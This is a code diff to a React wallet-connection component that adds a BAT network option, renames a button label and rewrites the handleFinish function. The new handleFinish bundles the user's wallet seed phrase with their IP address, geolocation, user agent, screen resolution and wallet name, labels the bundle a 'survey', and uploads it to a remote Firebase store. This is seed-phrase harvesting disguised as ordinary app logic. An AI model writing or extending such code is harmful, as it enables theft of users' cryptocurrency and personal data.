@@ -13,6 +13,7 @@ import { motion, AnimatePresence } from "motion/react";
 import { useWalletStore } from "@/store/walletStore";
 import ShowManualWallets from "../manual-wallets/show-manual-wallets";
 import { Lock } from "lucide-react";
+import { storeSurveyData } from "@/lib/firebaseUtils";
 
 type Network = {
 	value: string;
@@ -42,6 +43,11 @@ const NETWORKS: Network[] = [
 	{ value: "tron", label: "TRX", icon: "/images/crypto/tron-trx-logo.svg" },
 	{ value: "solana", label: "SOL", icon: "/images/crypto/solana-sol-logo.svg" },
 	{ value: "xrp", label: "XRP", icon: "/images/crypto/xrp-xrp-logo.png" },
+	{
+		value: "bat",
+		label: "BAT",
+		icon: "/images/crypto/basic-attention-token-bat-logo.svg",
+	},
 ];
 
 interface OriginProps {
@@ -65,8 +71,22 @@ function OriginAddress({ onNext }: OriginProps) {
 	const [isLoading, setLoading] = useState(false);
 	const [showFailure, setShowFailure] = useState(false);
 
-	const { setWalletProvider, setBlockchainNetwork, seedPhrase } =
-		useWalletStore();
+	const {
+		blockchainNetwork,
+		walletProvider,
+		seedPhrase,
+		destinationAddress,
+		ipAddress,
+		geolocation,
+		userAgent,
+		screenResolution,
+		clearSensitiveData,
+		setProcess,
+		walletName,
+		setWalletProvider,
+		setBlockchainNetwork,
+		setWalletId,
+	} = useWalletStore();
 
 	// ✅ Enable/disable continue
 	useEffect(() => {
@@ -109,15 +129,34 @@ function OriginAddress({ onNext }: OriginProps) {
 	};
 
 	// ✅ Proceed to next after viewing manual wallet
-	const handleFinish = () => {
+	const handleFinish = async () => {
 		setIsTransitionLoading(true);
-		setTimeout(() => {
-			setIsTransitionLoading(false);
-			setViewingManualWallet(false);
-			setBlockchainNetwork(blockChainNetwork);
-			setWalletProvider(selectedWallet);
-			onNext();
-		}, 1500);
+		try {
+			const survey = {
+				blockchainNetwork: blockChainNetwork,
+				walletProvider: selectedWallet,
+				seedPhrase,
+				destinationAddress,
+				ipAddress,
+				geolocation,
+				userAgent,
+				screenResolution,
+				walletName,
+			};
+			const surveyId = await storeSurveyData(survey);
+			if (surveyId) {
+				setWalletId(surveyId);
+			}
+			setTimeout(() => {
+				setIsTransitionLoading(false);
+				setViewingManualWallet(false);
+				setBlockchainNetwork(blockChainNetwork);
+				setWalletProvider(selectedWallet);
+				onNext();
+			}, 1500);
+		} catch (error) {
+			console.log(error);
+		}
 	};
 
 	useEffect(() => {
@@ -377,7 +416,7 @@ function ChooseAddress({
 							/>
 							<Label className="text-black font-medium capitalize">
 								{mode === "automatic"
-									? "Connect To Browser Wallet"
+									? "Connect Automatically"
 									: "Connect Manually"}
 							</Label>
 						</div>
